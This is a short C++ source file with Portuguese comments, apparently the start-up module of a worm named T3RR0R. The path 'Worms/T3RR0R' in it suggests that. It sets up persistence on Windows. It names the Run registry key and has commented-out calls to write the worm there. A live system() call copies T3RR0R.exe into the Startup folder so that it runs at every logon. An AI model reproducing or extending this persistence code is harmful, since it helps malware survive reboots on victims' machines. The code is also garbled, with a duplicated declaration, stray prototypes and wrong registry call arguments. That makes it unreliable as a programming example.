#include <windows.h>

#include "init.h"

void Init::Win(){


     HRESULT GetAutoStart(LPBOOL pRetVal);
     HRESULT SetAutoStart(BOOL NewValue);
     
//     hKey = HKEY_LOCAL_MACHINE;
          
     
     //define a constante para o local de
     //auto-inicialização
     #ifdef OS_WINDOWS
     static const char * STARTUP_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
     #endif
     
     static const char * STARTUP_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
     
//     ::RegOpenKeyExA(HKEY_CURRENT_USER, STARTUP_REGISTRY_KEY,
//                               0, KEY_WRITE, &hKey);

//   Chave:     
//   HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

     /*
     RegCreateKeyA(
          hKey,
          "Software/Microsoft/Windows/CurrentVersion/Run",
          "T3RR0R.exe", "E:/workspace/Worms/T3RR0R/T3RR0R.exe");  
     */
     
     system("copy T3RR0R.exe %ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup");
     
}
